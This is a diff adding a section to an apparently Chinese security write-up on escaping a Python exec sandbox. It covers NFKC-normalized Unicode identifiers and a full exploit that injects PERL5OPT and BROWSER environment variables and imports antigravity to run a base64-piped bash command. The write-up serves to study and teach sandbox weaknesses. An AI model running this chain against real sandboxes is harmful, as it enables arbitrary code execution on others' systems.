@@ -1773,6 +1773,13 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#更进一步" class="md-nav__link">
+    更进一步
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2228,6 +2235,214 @@ dict(**kwargs) -&gt; new dictionary initialized with the name=value pairs
         <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
 <span class="n">exec</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div></p>
+<h3 id="更进一步">更进一步<a class="headerlink" href="#更进一步" title="Permanent link">#</a></h3>
+<p>实际上python是支持Non-ASCII Identifies也就是说可以使用unicode字符的，具体参考见: <a href="https://peps.python.org/pep-3131/">https://peps.python.org/pep-3131/</a> ，这里需要注意的是这一点:</p>
+<blockquote>
+<p>The following changes will need to be made to the parser:<br />
+1.  If a non-ASCII character is found in the UTF-8 representation of the source code, a forward scan is made to find the first ASCII non-identifier character (e.g. a space or punctuation character)<br />
+2.  The entire UTF-8 string is passed to a function to normalize the string to NFKC, and then verify that it follows the identifier syntax. No such callout is made for pure-ASCII identifiers, which continue to be parsed the way they are today. The Unicode database must start including the Other<em Start_Continue="Start|Continue">ID</em> property.<br />
+3.  If this specification is implemented for 2.x, reflective libraries (such as pydoc) must be verified to continue to work when Unicode strings appear in <code>__dict__</code> slots as keys.</p>
+</blockquote>
+<p>稍微翻译一下也就是说如果我们使用了UTF-8中的非ASCII码作为标识符，那么其会被函数转换为NFKC标准格式，也就是说我们可以使用例如<code>ʰ</code>来代替<code>h</code>，从而绕过限制。</p>
+<p>但是假如我们的题目会将用户输入先转换为NFKC标准格式再进行判断，并且将<code>_</code>这个字符也过滤，，我们还有办法实现任意代码执行吗？</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">unicodedata</span> <span class="kn">import</span> <span class="n">normalize</span>
+<span class="n">data</span>  <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">normalize</span><span class="p">(</span><span class="s2">&quot;NFKC&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s1">&#39;h@&quot;</span><span class="se">\&#39;</span><span class="s1">(_&#39;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">exec</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div>
+<p>很明显，我们没办法再覆盖一些魔术方法(因为方法名包含_)，但是实际上我们还是能通过一些操作来进行rce的，这个rce方式就是环境变量注入,具体文章可参考<a href="https://www.elttam.com/blog/env/">## HACKING WITH ENVIRONMENT VARIABLES</a></p>
+<p>我们这里先贴出最终的exp，然后再分析其原理:<br />
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">printable</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+<span class="kn">from</span> <span class="nn">unicodedata</span> <span class="kn">import</span> <span class="n">normalize</span>
+
+<span class="k">def</span> <span class="nf">translate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;x[</span><span class="si">{</span><span class="n">printable</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="si">}</span><span class="s2">]+&quot;</span>
+
+    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&quot;+&quot;</span><span class="p">)</span>
+
+
+<span class="n">code</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">from os import environ</span>
+<span class="s2">from string import printable as x</span>
+<span class="s2">environ[</span><span class="si">{</span><span class="n">translate</span><span class="p">(</span><span class="s2">&quot;PERL5OPT&quot;</span><span class="p">)</span><span class="si">}</span><span class="s2">] = </span><span class="si">{</span><span class="n">translate</span><span class="p">(</span><span class="s2">&quot;-Mbase;system(&#39;echo$IFS$9bHM=|base64$IFS$9-d|bash&#39;);exit;&quot;</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">environ[</span><span class="si">{</span><span class="n">translate</span><span class="p">(</span><span class="s2">&quot;BROWSER&quot;</span><span class="p">)</span><span class="si">}</span><span class="s2">] = </span><span class="si">{</span><span class="n">translate</span><span class="p">(</span><span class="s2">&quot;perlthanks&quot;</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">import antigravity</span>
+<span class="s2">&quot;&quot;&quot;</span> <span class="c1"># exp</span>
+
+<span class="n">normalize</span><span class="p">(</span><span class="s2">&quot;NFKC&quot;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s1">&#39;h&quot;</span><span class="se">\&#39;</span><span class="s1">(@_&#39;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;no!!!!&quot;</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">exec</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+</code></pre></div></p>
+<p>这个exp实际上利用到了perl的环境变量注入，这里不对perl做过多的深入研究，大概原理是在perl运行时会使用到<code>PERL5OPT</code>这个环境变量，这个环境变量可以指定<code>-M</code>选项导入模块，同时在这之后可以注入一段perl代码，利用这个最终实现任意代码执行。</p>
+<p>我们重点关注BROWSER环境变量和<code>antigravity</code>这个模块。<code>antigravity</code>这个模块实际上是在python添加的一个圣诞节彩蛋，我们可以在<a href="https://hg.python.org/cpython/file/tip/Lib/antigravity.py">这里</a>看到它的源码:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220321172430.png" /></p>
+<p>这里唯一值得注意的是其在被导入时会调用<code>webbrowser.open()</code>方法打开一个网站，我们在cpython中看看其<a href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py">代码</a>的实现，重点关注以下几个函数:</p>
+<p>open函数会在没有browser时先注册，然后调用<code>browser.open()</code>去打开对应的网址:<br />
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">open</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">new</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">autoraise</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Display url using the default browser.</span>
+<span class="sd">    If possible, open url in a location determined by new.</span>
+<span class="sd">    - 0: the same browser window (the default).</span>
+<span class="sd">    - 1: a new browser window.</span>
+<span class="sd">    - 2: a new browser page (&quot;tab&quot;).</span>
+<span class="sd">    If possible, autoraise raises the window (the default) or not.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">_tryorder</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">with</span> <span class="n">_lock</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">_tryorder</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="n">register_standard_browsers</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">_tryorder</span><span class="p">:</span>
+        <span class="n">browser</span> <span class="o">=</span> <span class="n">get</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">browser</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">new</span><span class="p">,</span> <span class="n">autoraise</span><span class="p">):</span>
+            <span class="k">return</span> <span class="kc">True</span>
+    <span class="k">return</span> <span class="kc">False</span>
+</code></pre></div></p>
+<p>register<em>standard</em>browsers函数会调用register函数注册浏览器，实际上就是将浏览器名字与对应的类绑定在了一起，我们注意到这里使用到了一个环境变量<code>BROWSER</code>，可以允许使用者覆盖自己的浏览器，如果设置了这个环境变量，其最终会注册一个GenericBrowser类:<br />
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">register_standard_browsers</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">_tryorder</span>
+    <span class="n">_tryorder</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">platform</span> <span class="o">==</span> <span class="s1">&#39;darwin&#39;</span><span class="p">:</span>
+        <span class="n">register</span><span class="p">(</span><span class="s2">&quot;MacOSX&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">MacOSXOSAScript</span><span class="p">(</span><span class="s1">&#39;default&#39;</span><span class="p">))</span>
+        <span class="n">register</span><span class="p">(</span><span class="s2">&quot;chrome&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">MacOSXOSAScript</span><span class="p">(</span><span class="s1">&#39;chrome&#39;</span><span class="p">))</span>
+        <span class="n">register</span><span class="p">(</span><span class="s2">&quot;firefox&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">MacOSXOSAScript</span><span class="p">(</span><span class="s1">&#39;firefox&#39;</span><span class="p">))</span>
+        <span class="n">register</span><span class="p">(</span><span class="s2">&quot;safari&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">MacOSXOSAScript</span><span class="p">(</span><span class="s1">&#39;safari&#39;</span><span class="p">))</span>
+        <span class="c1"># OS X can use below Unix support (but we prefer using the OS X</span>
+        <span class="c1"># specific stuff)</span>
+
+    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">platform</span> <span class="o">==</span> <span class="s2">&quot;serenityos&quot;</span><span class="p">:</span>
+        <span class="c1"># SerenityOS webbrowser, simply called &quot;Browser&quot;.</span>
+        <span class="n">register</span><span class="p">(</span><span class="s2">&quot;Browser&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">BackgroundBrowser</span><span class="p">(</span><span class="s2">&quot;Browser&quot;</span><span class="p">))</span>
+
+    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">platform</span><span class="p">[:</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;win&quot;</span><span class="p">:</span>
+        <span class="c1"># First try to use the default Windows browser</span>
+        <span class="n">register</span><span class="p">(</span><span class="s2">&quot;windows-default&quot;</span><span class="p">,</span> <span class="n">WindowsDefault</span><span class="p">)</span>
+
+        <span class="c1"># Detect some common Windows browsers, fallback to IE</span>
+        <span class="n">iexplore</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;PROGRAMFILES&quot;</span><span class="p">,</span> <span class="s2">&quot;C:</span><span class="se">\\</span><span class="s2">Program Files&quot;</span><span class="p">),</span>
+                                <span class="s2">&quot;Internet Explorer</span><span class="se">\\</span><span class="s2">IEXPLORE.EXE&quot;</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">browser</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">&quot;firefox&quot;</span><span class="p">,</span> <span class="s2">&quot;firebird&quot;</span><span class="p">,</span> <span class="s2">&quot;seamonkey&quot;</span><span class="p">,</span> <span class="s2">&quot;mozilla&quot;</span><span class="p">,</span>
+                        <span class="s2">&quot;netscape&quot;</span><span class="p">,</span> <span class="s2">&quot;opera&quot;</span><span class="p">,</span> <span class="n">iexplore</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">shutil</span><span class="o">.</span><span class="n">which</span><span class="p">(</span><span class="n">browser</span><span class="p">):</span>
+                <span class="n">register</span><span class="p">(</span><span class="n">browser</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">BackgroundBrowser</span><span class="p">(</span><span class="n">browser</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="c1"># Prefer X browsers if present</span>
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;DISPLAY&quot;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;WAYLAND_DISPLAY&quot;</span><span class="p">):</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;xdg-settings get default-web-browser&quot;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+                <span class="n">raw_result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">)</span>
+                <span class="n">result</span> <span class="o">=</span> <span class="n">raw_result</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+            <span class="k">except</span> <span class="p">(</span><span class="ne">FileNotFoundError</span><span class="p">,</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span><span class="p">,</span> <span class="ne">PermissionError</span><span class="p">,</span> <span class="ne">NotADirectoryError</span><span class="p">)</span> <span class="p">:</span>
+                <span class="k">pass</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">global</span> <span class="n">_os_preferred_browser</span>
+                <span class="n">_os_preferred_browser</span> <span class="o">=</span> <span class="n">result</span>
+
+            <span class="n">register_X_browsers</span><span class="p">()</span>
+
+        <span class="c1"># Also try console browsers</span>
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;TERM&quot;</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">shutil</span><span class="o">.</span><span class="n">which</span><span class="p">(</span><span class="s2">&quot;www-browser&quot;</span><span class="p">):</span>
+                <span class="n">register</span><span class="p">(</span><span class="s2">&quot;www-browser&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">GenericBrowser</span><span class="p">(</span><span class="s2">&quot;www-browser&quot;</span><span class="p">))</span>
+            <span class="c1"># The Links/elinks browsers &lt;http://artax.karlin.mff.cuni.cz/~mikulas/links/&gt;</span>
+            <span class="k">if</span> <span class="n">shutil</span><span class="o">.</span><span class="n">which</span><span class="p">(</span><span class="s2">&quot;links&quot;</span><span class="p">):</span>
+                <span class="n">register</span><span class="p">(</span><span class="s2">&quot;links&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">GenericBrowser</span><span class="p">(</span><span class="s2">&quot;links&quot;</span><span class="p">))</span>
+            <span class="k">if</span> <span class="n">shutil</span><span class="o">.</span><span class="n">which</span><span class="p">(</span><span class="s2">&quot;elinks&quot;</span><span class="p">):</span>
+                <span class="n">register</span><span class="p">(</span><span class="s2">&quot;elinks&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">Elinks</span><span class="p">(</span><span class="s2">&quot;elinks&quot;</span><span class="p">))</span>
+            <span class="c1"># The Lynx browser &lt;http://lynx.isc.org/&gt;, &lt;http://lynx.browser.org/&gt;</span>
+            <span class="k">if</span> <span class="n">shutil</span><span class="o">.</span><span class="n">which</span><span class="p">(</span><span class="s2">&quot;lynx&quot;</span><span class="p">):</span>
+                <span class="n">register</span><span class="p">(</span><span class="s2">&quot;lynx&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">GenericBrowser</span><span class="p">(</span><span class="s2">&quot;lynx&quot;</span><span class="p">))</span>
+            <span class="c1"># The w3m browser &lt;http://w3m.sourceforge.net/&gt;</span>
+            <span class="k">if</span> <span class="n">shutil</span><span class="o">.</span><span class="n">which</span><span class="p">(</span><span class="s2">&quot;w3m&quot;</span><span class="p">):</span>
+                <span class="n">register</span><span class="p">(</span><span class="s2">&quot;w3m&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">GenericBrowser</span><span class="p">(</span><span class="s2">&quot;w3m&quot;</span><span class="p">))</span>
+
+    <span class="c1"># OK, now that we know what the default preference orders for each</span>
+    <span class="c1"># platform are, allow user to override them with the BROWSER variable.</span>
+    <span class="k">if</span> <span class="s2">&quot;BROWSER&quot;</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">:</span>
+        <span class="n">userchoices</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s2">&quot;BROWSER&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">pathsep</span><span class="p">)</span>
+        <span class="n">userchoices</span><span class="o">.</span><span class="n">reverse</span><span class="p">()</span>
+
+        <span class="c1"># Treat choices in same way as if passed into get() but do register</span>
+        <span class="c1"># and prepend to _tryorder</span>
+        <span class="k">for</span> <span class="n">cmdline</span> <span class="ow">in</span> <span class="n">userchoices</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">cmdline</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
+                <span class="n">cmd</span> <span class="o">=</span> <span class="n">_synthesize</span><span class="p">(</span><span class="n">cmdline</span><span class="p">,</span> <span class="n">preferred</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+                    <span class="n">register</span><span class="p">(</span><span class="n">cmdline</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">GenericBrowser</span><span class="p">(</span><span class="n">cmdline</span><span class="p">),</span> <span class="n">preferred</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</code></pre></div></p>
+<p><code>GenericBrowser.open()</code>函数是我们最终的目的，其实际上调用了<code>subprocess.open()</code>函数来实现使用浏览器打开的目的:<br />
+<div class="highlight"><pre><span></span><code><span class="k">class</span> <span class="nc">GenericBrowser</span><span class="p">(</span><span class="n">BaseBrowser</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Class for all browsers started with a command</span>
+<span class="sd">       and without remote functionality.&quot;&quot;&quot;</span>
+
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">args</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="c1"># name should be a list with arguments</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">args</span> <span class="o">=</span> <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">basename</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">open</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">new</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">autoraise</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">audit</span><span class="p">(</span><span class="s2">&quot;webbrowser.open&quot;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+        <span class="n">cmdline</span> <span class="o">=</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="n">arg</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+                                 <span class="k">for</span> <span class="n">arg</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="p">]</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">platform</span><span class="p">[:</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">:</span>
+                <span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmdline</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmdline</span><span class="p">,</span> <span class="n">close_fds</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+            <span class="k">return</span> <span class="ow">not</span> <span class="n">p</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+        <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">False</span>
+</code></pre></div></p>
+<p>综上所述，如果我们控制了<code>BROWSER</code>这个环境变量，就可以控制命令执行调用的命令，最终执行类似于<code>BROWSER https://xkcd.com/353/</code>这样的命令，我们是没办法控制命令的参数的。这里就需要利用到其他命令的环境变量注入了。</p>
+<p>在一般的linux发行版中，一般自带了perl这个编程语言以及默认的perl脚本，例如perldoc和perlthanks，这里exp最终使用的是perlthanks/perldoc而非使用perl的原因是如果执行<code>perl https://xkcd.com/353/</code>，那么perl会报错返回，不会处理<code>PERL5OPT</code>这个环境变量，而<code>perldoc</code>与<code>perlthanks</code>这2个脚本则再处理了<code>PERL5OPT</code>之后返回，这给了我们最终exp的机会。</p>
+<p>最终我们来回顾一下exp，除了上面提到的点之外，我们还使用了<code>string.printable</code>这串字符串来构造任意字符，其包含了所有可见的ascii字符。<br />
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">printable</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+<span class="kn">from</span> <span class="nn">unicodedata</span> <span class="kn">import</span> <span class="n">normalize</span>
+
+<span class="k">def</span> <span class="nf">translate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;x[</span><span class="si">{</span><span class="n">printable</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="si">}</span><span class="s2">]+&quot;</span>
+
+    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&quot;+&quot;</span><span class="p">)</span>
+
+
+<span class="n">code</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">from os import environ</span>
+<span class="s2">from string import printable as x</span>
+<span class="s2">environ[</span><span class="si">{</span><span class="n">translate</span><span class="p">(</span><span class="s2">&quot;PERL5OPT&quot;</span><span class="p">)</span><span class="si">}</span><span class="s2">] = </span><span class="si">{</span><span class="n">translate</span><span class="p">(</span><span class="s2">&quot;-Mbase;system(&#39;echo$IFS$9bHM=|base64$IFS$9-d|bash&#39;);exit;&quot;</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">environ[</span><span class="si">{</span><span class="n">translate</span><span class="p">(</span><span class="s2">&quot;BROWSER&quot;</span><span class="p">)</span><span class="si">}</span><span class="s2">] = </span><span class="si">{</span><span class="n">translate</span><span class="p">(</span><span class="s2">&quot;perlthanks&quot;</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">import antigravity</span>
+<span class="s2">&quot;&quot;&quot;</span> <span class="c1"># exp</span>
+
+<span class="n">normalize</span><span class="p">(</span><span class="s2">&quot;NFKC&quot;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s1">&#39;h&quot;</span><span class="se">\&#39;</span><span class="s1">(@_&#39;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;no!!!!&quot;</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">exec</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
 </code></pre></div></p>
 
               
